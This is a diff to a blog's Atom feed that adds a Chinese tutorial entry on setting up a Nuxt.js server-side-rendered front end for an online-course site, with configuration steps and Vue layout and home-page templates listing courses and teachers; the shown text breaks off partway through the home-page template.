@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://crlrlc.github.io/</id>
     <title>Gridea</title>
-    <updated>2023-06-20T14:18:34.698Z</updated>
+    <updated>2023-06-20T14:32:31.748Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://crlrlc.github.io/"/>
     <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
@@ -10,6 +10,779 @@
     <logo>https://crlrlc.github.io/images/avatar.png</logo>
     <icon>https://crlrlc.github.io/favicon.ico</icon>
     <rights>All rights reserved 2023, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[Day210.服务端渲染技术NUXT、整合前台主页面、名师、课程静态页面、首页整合banner数据后端部分【创建banner微服务、接口、banner后台前端实现】]]></title>
+        <id>https://crlrlc.github.io/post/day210fu-wu-duan-xuan-ran-ji-zhu-nuxtzheng-he-qian-tai-zhu-ye-mian-ming-shi-ke-cheng-jing-tai-ye-mian-shou-ye-zheng-he-banner-shu-ju-hou-duan-bu-fen-chuang-jian-banner-wei-fu-wu-jie-kou-banner-hou-tai-qian-duan-shi-xian/</id>
+        <link href="https://crlrlc.github.io/post/day210fu-wu-duan-xuan-ran-ji-zhu-nuxtzheng-he-qian-tai-zhu-ye-mian-ming-shi-ke-cheng-jing-tai-ye-mian-shou-ye-zheng-he-banner-shu-ju-hou-duan-bu-fen-chuang-jian-banner-wei-fu-wu-jie-kou-banner-hou-tai-qian-duan-shi-xian/">
+        </link>
+        <updated>2023-06-20T14:19:46.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="服务端渲染技术nuxt">服务端渲染技术NUXT</h1>
+<h2 id="一-服务端渲染技术nuxt">一、服务端渲染技术NUXT</h2>
+<h3 id="1-什么是服务端渲染">1、什么是服务端渲染</h3>
+<p>服务端渲染又称SSR (Server Side Render)是在服务端完成页面的内容，而不是在客户端通过AJAX获取数据。</p>
+<p>服务器端渲染(SSR)的优势主要在于：更好的 SEO，由于搜索引擎爬虫抓取工具可以直接查看完全渲染的页面。</p>
+<p>如果你的应用程序初始展示 loading 菊花图，然后通过 Ajax 获取内容，抓取工具并不会等待异步完成后再进行页面内容的抓取。也就是说，如果 SEO 对你的站点至关重要，而你的页面又是异步获取内容，则你可能需要服务器端渲染(SSR)解决此问题。</p>
+<p>另外，使用服务器端渲染，我们可以获得更快的内容到达时间(time-to-content)，无需等待所有的JavaScript 都完成下载并执行，产生更好的用户体验，对于那些「内容到达时间(time-to-content)与转化率直接相关」的应用程序而言，服务器端渲染(SSR)至关重要。</p>
+<h3 id="2-什么是nuxt">2、什么是NUXT</h3>
+<p>Nuxt.js 是一个基于 Vue.js 的轻量级应用框架,可用来创建服务端渲染 (SSR) 应用,也可充当静态站点引擎生成静态站点应用,具有优雅的代码结构分层和热加载等特性。<br>
+官网网站：</p>
+<p>https://zh.nuxtjs.org/</p>
+<h2 id="二-nuxt环境初始化">二、NUXT环境初始化</h2>
+<h3 id="1-下载压缩包">1、下载压缩包</h3>
+<p>https://github.com/nuxt-community/starter-template/archive/master.zip</p>
+<h3 id="2-解压">2、解压</h3>
+<p>将template中的内容复制到 guli，命名为：guli-front<br>
+<img src="https://crlrlc.github.io//post-images/1687270853493.png" alt="" loading="lazy"></p>
+<h3 id="3-安装eslint">3、安装ESLint</h3>
+<p>将guli-admin项目下的.eslintrc.js配置文件复制到当前项目下</p>
+<h3 id="4-修改packagejson">4、修改package.json</h3>
+<p>name、description、author（必须修改这里，否则项目无法安装）</p>
+<pre><code class="language-json">&quot;name&quot;: &quot;guli&quot;,
+&quot;version&quot;: &quot;1.0.0&quot;,
+&quot;description&quot;: &quot;谷粒学院前台网站&quot;,
+&quot;author&quot;: &quot;Helen &lt;55317332@qq.com&gt;&quot;,
+</code></pre>
+<h3 id="5-修改nuxtconfigjs">5、修改nuxt.config.js</h3>
+<p>修改title: ‘{{ name }}’、content: ‘{{escape description }}’</p>
+<p>这里的设置最后会显示在页面标题栏和meta数据中</p>
+<pre><code class="language-js">head: {
+    title: '谷粒学院 - Java视频|HTML5视频|前端视频|Python视频|大数据视频-自学拿1万+月薪的IT在线视频课程，谷粉力挺，老学员为你推荐',
+    meta: [
+   		 { charset: 'utf-8' },
+    	 { name: 'viewport', content: 'width=device-width, initial-scale=1' },
+   		 { hid: 'keywords', name: 'keywords', content: '谷粒学院,IT在线视频教程,Java视频,HTML5视频,前端视频,Python视频,大数据视频' },
+    { hid: 'description', name: 'description', content: '谷粒学院是国内领先的IT在线视频学习平台、职业教育平台。截止目前,谷粒学院线上、线下学习人次数以万计！会同上百个知名开发团队联合制定的Java、HTML5前端、大数据、Python等视频课程，被广大学习者及IT工程师誉为：业界最适合自学、代码量最大、案例最多、实战性最强、技术最前沿的IT系列视频课程！' }
+    ],
+    link: [
+	    { rel: 'icon', type: 'image/x-icon', href: '/favicon.ico' }
+    ]
+},
+</code></pre>
+<h3 id="6-在命令提示终端中进入项目目录">6、在命令提示终端中进入项目目录</h3>
+<figure data-type="image" tabindex="1"><img src="https://crlrlc.github.io//post-images/1687271021449.png" alt="" loading="lazy"></figure>
+<h3 id="7-安装依赖">7、安装依赖</h3>
+<pre><code class="language-shell">npm install
+</code></pre>
+<h3 id="8-测试运行">8、测试运行</h3>
+<pre><code class="language-shell">npm run dev
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://crlrlc.github.io//post-images/1687271091534.png" alt="" loading="lazy"></figure>
+<h3 id="9-nuxt目录结构">9、NUXT目录结构</h3>
+<p><img src="https://crlrlc.github.io//post-images/1687271134103.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1687271165564.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1687271188163.png" alt="" loading="lazy"></p>
+<h1 id="整合项目主页面">整合项目主页面</h1>
+<h2 id="一-幻灯片插件">一、幻灯片插件</h2>
+<h3 id="1-安装插件">1、安装插件</h3>
+<pre><code class="language-shell">npm install vue-awesome-swiper
+
+npm install swiper
+</code></pre>
+<h2 id="2-配置幻灯片插件">2、配置幻灯片插件</h2>
+<p>在 plugins 文件夹下新建文件 nuxt-swiper-plugin.js ，内容是</p>
+<pre><code class="language-js">import Vue from 'vue'
+import VueAwesomeSwiper from '../node_modules/vue-awesome-swiper/dist/ssr'
+Vue.use(VueAwesomeSwiper)
+</code></pre>
+<p>在 nuxt.config.js 文件中配置插件</p>
+<p>将 plugins 和 css 节点 复制到 module.exports 节点下</p>
+<pre><code class="language-js">module.exports = {
+    // some nuxt config...
+    plugins: [
+	    { src: '~/plugins/nuxt-swiper-plugin.js', ssr: false }
+    ],
+    css: [
+	    'swiper/dist/css/swiper.css'
+    ]
+}
+</code></pre>
+<h2 id="二-页面布局">二、页面布局</h2>
+<h3 id="1-复制静态资源">1、复制静态资源</h3>
+<p>将静态原型中的css、img、js、photo目录拷贝至assets目录下</p>
+<p>将favicon.ico复制到static目录下<br>
+<img src="https://crlrlc.github.io//post-images/1687271334102.png" alt="" loading="lazy"></p>
+<h3 id="2-定义布局">2、定义布局</h3>
+<p>我们可以把页头和页尾提取出来，形成布局页</p>
+<p>修改layouts目录下default.vue，从静态页面中复制首页，修改了原始文件中的资源路径为~/assets/，将</p>
+<p>主内容区域的内容替换成&lt; nuxt /&gt;</p>
+<p>内容如下：</p>
+<pre><code class="language-html">&lt;template&gt;
+    &lt;div&gt;
+    &lt;!-- 页头部分 --&gt;
+    &lt;!-- 内容的区域 --&gt;
+    	&lt;nuxt/&gt;
+    &lt;!-- 页尾部分 --&gt;
+    &lt;/div&gt;
+&lt;/template&gt;
+</code></pre>
+<p>完整的内容如下：</p>
+<pre><code class="language-html">
+&lt;template&gt;
+  &lt;div class=&quot;in-wrap&quot;&gt;
+    &lt;!-- 公共头引入 --&gt;
+    &lt;header id=&quot;header&quot;&gt;
+      &lt;section class=&quot;container&quot;&gt;
+        &lt;h1 id=&quot;logo&quot;&gt;
+          &lt;a href=&quot;#&quot; title=&quot;阿昌之谷粒学院&quot;&gt;
+            &lt;img
+              src=&quot;~/assets/img/logo.png&quot;
+              width=&quot;100%&quot;
+              alt=&quot;阿昌之谷粒学院&quot;
+            /&gt;
+          &lt;/a&gt;
+        &lt;/h1&gt;
+        &lt;div class=&quot;h-r-nsl&quot;&gt;
+          &lt;ul class=&quot;nav&quot;&gt;
+            &lt;router-link to=&quot;/&quot; tag=&quot;li&quot; active-class=&quot;current&quot; exact&gt;
+              &lt;a&gt;首页&lt;/a&gt;
+            &lt;/router-link&gt;
+            &lt;router-link to=&quot;/course&quot; tag=&quot;li&quot; active-class=&quot;current&quot;&gt;
+              &lt;a&gt;课程&lt;/a&gt;
+            &lt;/router-link&gt;
+            &lt;router-link to=&quot;/teacher&quot; tag=&quot;li&quot; active-class=&quot;current&quot;&gt;
+              &lt;a&gt;名师&lt;/a&gt;
+            &lt;/router-link&gt;
+            &lt;router-link to=&quot;/article&quot; tag=&quot;li&quot; active-class=&quot;current&quot;&gt;
+              &lt;a&gt;文章&lt;/a&gt;
+            &lt;/router-link&gt;
+            &lt;router-link to=&quot;/qa&quot; tag=&quot;li&quot; active-class=&quot;current&quot;&gt;
+              &lt;a&gt;问答&lt;/a&gt;
+            &lt;/router-link&gt;
+          &lt;/ul&gt;
+          &lt;!-- / nav --&gt;
+          &lt;ul class=&quot;h-r-login&quot;&gt;
+            &lt;li id=&quot;no-login&quot;&gt;
+              &lt;a href=&quot;/sing_in&quot; title=&quot;登录&quot;&gt;
+                &lt;em class=&quot;icon18 login-icon&quot;&gt;&amp;nbsp;&lt;/em&gt;
+                &lt;span class=&quot;vam ml5&quot;&gt;登录&lt;/span&gt;
+              &lt;/a&gt;
+              |
+              &lt;a href=&quot;/sign_up&quot; title=&quot;注册&quot;&gt;
+                &lt;span class=&quot;vam ml5&quot;&gt;注册&lt;/span&gt;
+              &lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;mr10 undis&quot; id=&quot;is-login-one&quot;&gt;
+              &lt;a href=&quot;#&quot; title=&quot;消息&quot; id=&quot;headerMsgCountId&quot;&gt;
+                &lt;em class=&quot;icon18 news-icon&quot;&gt;&amp;nbsp;&lt;/em&gt;
+              &lt;/a&gt;
+              &lt;q class=&quot;red-point&quot; style=&quot;display: none&quot;&gt;&amp;nbsp;&lt;/q&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;h-r-user undis&quot; id=&quot;is-login-two&quot;&gt;
+              &lt;a href=&quot;#&quot; title&gt;
+                &lt;img
+                  src=&quot;~/assets/img/avatar-boy.gif&quot;
+                  width=&quot;30&quot;
+                  height=&quot;30&quot;
+                  class=&quot;vam picImg&quot;
+                  alt
+                /&gt;
+                &lt;span class=&quot;vam disIb&quot; id=&quot;userName&quot;&gt;&lt;/span&gt;
+              &lt;/a&gt;
+              &lt;a
+                href=&quot;javascript:void(0)&quot;
+                title=&quot;退出&quot;
+                onclick=&quot;exit();&quot;
+                class=&quot;ml5&quot;
+                &gt;退出&lt;/a
+              &gt;
+            &lt;/li&gt;
+            &lt;!-- /未登录显示第1 li；登录后显示第2，3 li --&gt;
+          &lt;/ul&gt;
+          &lt;aside class=&quot;h-r-search&quot;&gt;
+            &lt;form action=&quot;#&quot; method=&quot;post&quot;&gt;
+              &lt;label class=&quot;h-r-s-box&quot;&gt;
+                &lt;input
+                  type=&quot;text&quot;
+                  placeholder=&quot;输入你想学的课程&quot;
+                  name=&quot;queryCourse.courseName&quot;
+                  value
+                /&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;s-btn&quot;&gt;
+                  &lt;em class=&quot;icon18&quot;&gt;&amp;nbsp;&lt;/em&gt;
+                &lt;/button&gt;
+              &lt;/label&gt;
+            &lt;/form&gt;
+          &lt;/aside&gt;
+        &lt;/div&gt;
+        &lt;aside class=&quot;mw-nav-btn&quot;&gt;
+          &lt;div class=&quot;mw-nav-icon&quot;&gt;&lt;/div&gt;
+        &lt;/aside&gt;
+        &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
+      &lt;/section&gt;
+    &lt;/header&gt;
+    &lt;!-- /公共头引入 --&gt;
+      
+	&lt;nuxt /&gt;
+      
+    &lt;!-- 公共底引入 --&gt;
+    &lt;footer id=&quot;footer&quot;&gt;
+      &lt;section class=&quot;container&quot;&gt;
+        &lt;div class&gt;
+          &lt;h4 class=&quot;hLh30&quot;&gt;
+            &lt;span class=&quot;fsize18 f-fM c-999&quot;&gt;友情链接&lt;/span&gt;
+          &lt;/h4&gt;
+          &lt;ul class=&quot;of flink-list&quot;&gt;
+            &lt;li&gt;
+              &lt;a href=&quot;http://www.atguigu.com/&quot; title=&quot;阿昌&quot; target=&quot;_blank&quot;
+                &gt;阿昌&lt;/a
+              &gt;
+            &lt;/li&gt;
+          &lt;/ul&gt;
+          &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;b-foot&quot;&gt;
+          &lt;section class=&quot;fl col-7&quot;&gt;
+            &lt;section class=&quot;mr20&quot;&gt;
+              &lt;section class=&quot;b-f-link&quot;&gt;
+                &lt;a href=&quot;#&quot; title=&quot;关于我们&quot; target=&quot;_blank&quot;&gt;关于我们&lt;/a&gt;|
+                &lt;a href=&quot;#&quot; title=&quot;联系我们&quot; target=&quot;_blank&quot;&gt;联系我们&lt;/a&gt;|
+                &lt;a href=&quot;#&quot; title=&quot;帮助中心&quot; target=&quot;_blank&quot;&gt;帮助中心&lt;/a&gt;|
+                &lt;a href=&quot;#&quot; title=&quot;资源下载&quot; target=&quot;_blank&quot;&gt;资源下载&lt;/a&gt;|
+                &lt;span&gt;服务热线：18757750375(温州) 17376597290(杭州)&lt;/span&gt;
+                &lt;span&gt;Email：info@atguigu.com&lt;/span&gt;
+              &lt;/section&gt;
+              &lt;section class=&quot;b-f-link mt10&quot;&gt;
+                &lt;span&gt;©2021阿昌之谷粒学院&lt;/span&gt;
+              &lt;/section&gt;
+            &lt;/section&gt;
+          &lt;/section&gt;
+          &lt;aside class=&quot;fl col-3 tac mt15&quot;&gt;
+            &lt;section class=&quot;gf-tx&quot;&gt;
+              &lt;span&gt;
+                &lt;img src=&quot;~/assets/img/wx-icon.png&quot; alt /&gt;
+              &lt;/span&gt;
+            &lt;/section&gt;
+            &lt;section class=&quot;gf-tx&quot;&gt;
+              &lt;span&gt;
+                &lt;img src=&quot;~/assets/img/wb-icon.png&quot; alt /&gt;
+              &lt;/span&gt;
+            &lt;/section&gt;
+          &lt;/aside&gt;
+          &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/section&gt;
+    &lt;/footer&gt;
+    &lt;!-- /公共底引入 --&gt;
+  &lt;/div&gt;
+&lt;/template&gt;
+&lt;script&gt;
+import &quot;~/assets/css/reset.css&quot;;
+import &quot;~/assets/css/theme.css&quot;;
+import &quot;~/assets/css/global.css&quot;;
+import &quot;~/assets/css/web.css&quot;;
+export default {};
+&lt;/script&gt;
+</code></pre>
+<h3 id="3-定义首页面">3、定义首页面</h3>
+<p>（ 不包含幻灯片 ）</p>
+<p>修改pages/index.vue：</p>
+<p>修改了原始文件中的资源路径为~/assets/</p>
+<p>内容如下：</p>
+<pre><code class="language-html">&lt;template&gt;
+  &lt;div&gt;
+    &lt;!-- 幻灯片 开始 --&gt;
+    &lt;!-- 幻灯片 结束 --&gt;
+    &lt;div id=&quot;aCoursesList&quot;&gt;
+      &lt;!-- 网校课程 开始 --&gt;
+      &lt;div&gt;
+        &lt;section class=&quot;container&quot;&gt;
+          &lt;header class=&quot;comm-title&quot;&gt;
+            &lt;h2 class=&quot;tac&quot;&gt;
+              &lt;span class=&quot;c-333&quot;&gt;热门课程&lt;/span&gt;
+            &lt;/h2&gt;
+          &lt;/header&gt;
+          &lt;div&gt;
+            &lt;article class=&quot;comm-course-list&quot;&gt;
+              &lt;ul class=&quot;of&quot; id=&quot;bna&quot;&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442295592705.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;听力口语&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;听力口语&quot;
+                        class=&quot;course-title fsize18 c- 333&quot;
+                        &gt;听力口语&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;9634人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;9634评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442295581911.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;Java精品课程&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;Java精品课程&quot;
+                        class=&quot;course-title fsize18 c-333&quot;
+                        &gt;Java精品课程&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;501人学习&lt;/i&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;501评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442295604295.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;C4D零基础&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;C4D零基础&quot;
+                        class=&quot;course-title fsize18 c- 333&quot;
+                        &gt;C4D零基础&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;300人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;300评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442302831779.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;数学给宝宝带来的兴趣&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;数学给宝宝带来的兴趣&quot;
+                        class=&quot;course-title fsize18 c-333&quot;
+                        &gt;数学给宝宝带来的兴趣&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;256人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;256评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442295455437.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;零基础入门学习Python课程学习&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;零基础入门学习Python课程学习&quot;
+                        class=&quot;course-title fsize18 c-333&quot;
+                        &gt;零基础入门学习Python课程学习&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;137人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;137评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442295570359.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;MySql从入门到精通&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;MySql从入门到精通&quot;
+                        class=&quot;course-title fsize18 c-333&quot;
+                        &gt;MySql从入门到精通&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;125人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;125评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442302852837.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;搜索引擎优化技术&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;搜索引擎优化技术&quot;
+                        class=&quot;course-title fsize18 c-333&quot;
+                        &gt;搜索引擎优化技术&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;123人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;123评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;div class=&quot;cc-l-wrap&quot;&gt;
+                    &lt;section class=&quot;course-img&quot;&gt;
+                      &lt;img
+                        src=&quot;~/assets/photo/course/1442295379715.jpg&quot;
+                        class=&quot;img-responsive&quot;
+                        alt=&quot;20世纪西方音乐&quot;
+                      /&gt;
+                      &lt;div class=&quot;cc-mask&quot;&gt;
+                        &lt;a href=&quot;#&quot; title=&quot;开始学习&quot; class=&quot;comm-btn c-btn-1&quot;
+                          &gt;开始 学习&lt;/a
+                        &gt;
+                      &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;h3 class=&quot;hLh30 txtOf mt10&quot;&gt;
+                      &lt;a
+                        href=&quot;#&quot;
+                        title=&quot;20世纪西方音乐&quot;
+                        class=&quot;course-title fsize18 c-333&quot;
+                        &gt;20世纪西方音乐&lt;/a
+                      &gt;
+                    &lt;/h3&gt;
+                    &lt;section class=&quot;mt10 hLh20 of&quot;&gt;
+                      &lt;span class=&quot;fr jgTag bg-green&quot;&gt;
+                        &lt;i class=&quot;c-fff fsize12 f-fA&quot;&gt;免费&lt;/i&gt;
+                      &lt;/span&gt;
+                      &lt;span class=&quot;fl jgAttr c-ccc f-fA&quot;&gt;
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;34人学习&lt;/i&gt;
+                        |
+                        &lt;i class=&quot;c-999 f-fA&quot;&gt;34评论&lt;/i&gt;
+                      &lt;/span&gt;
+                    &lt;/section&gt;
+                  &lt;/div&gt;
+                &lt;/li&gt;
+              &lt;/ul&gt;
+              &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
+            &lt;/article&gt;
+            &lt;section class=&quot;tac pt20&quot;&gt;
+              &lt;a href=&quot;#&quot; title=&quot;全部课程&quot; class=&quot;comm-btn c-btn-2&quot;&gt;全部课程&lt;/a&gt;
+            &lt;/section&gt;
+          &lt;/div&gt;
+        &lt;/section&gt;
+      &lt;/div&gt;
+      &lt;!-- /网校课程 结束 --&gt;
+      &lt;!-- 网校名师 开始 --&gt;
+      &lt;div&gt;
+        &lt;section class=&quot;container&quot;&gt;
+          &lt;header class=&quot;comm-title&quot;&gt;
+            &lt;h2 class=&quot;tac&quot;&gt;
+              &lt;span class=&quot;c-333&quot;&gt;名师大咖&lt;/span&gt;
+            &lt;/h2&gt;
+          &lt;/header&gt;
+          &lt;div&gt;
+            &lt;article class=&quot;i-teacher-list&quot;&gt;
+              &lt;ul class=&quot;of&quot;&gt;
+                &lt;li&gt;
+                  &lt;section class=&quot;i-teach-wrap&quot;&gt;
+                    &lt;div class=&quot;i-teach-pic&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;姚晨&quot;&gt;
+                        &lt;img
+                          alt=&quot;姚晨&quot;
+                          src=&quot;~/assets/photo/teacher/1442297885942.jpg&quot;
+                        /&gt;
+                      &lt;/a&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt10 hLh30 txtOf tac&quot;&gt;
